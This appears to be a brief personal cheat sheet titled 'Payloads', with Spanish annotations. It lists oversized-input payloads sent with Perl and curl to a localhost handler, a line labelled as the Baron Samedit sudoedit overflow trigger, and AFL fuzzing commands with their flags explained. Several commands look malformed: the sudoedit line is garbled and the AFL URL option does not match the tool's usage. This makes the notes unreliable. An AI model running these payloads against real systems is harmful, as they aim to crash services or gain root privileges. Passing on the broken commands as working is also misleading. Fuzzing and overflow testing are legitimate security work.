# Payloads

perl -e 'print "A" x 20' | curl -k -d @- localhost:8080/handler

    sudoedit -s \\ perl -e 'print "A" x 20' (Baron samedit)

    afl-fuzz -i in -o out ./your_program @@

    afl-fuzz -i in -o out -U http://localhost:8080/handler @@


-i in: Directorio que contiene los casos de prueba iniciales.
-o out: Directorio donde se almacenarán los resultados del fuzzing.
./your_program: Ruta al ejecutable instrumentado de tu programa.
@@: Un marcador especial que indica que AFL debe pasar los casos de prueba como argumento a tu programa.



perl -e 'print "A" x 200000000' | curl -k -d @- localhost:8080/handler curl: (55) Send failure: Connection reset by peer

> El anterior es un error de curl.



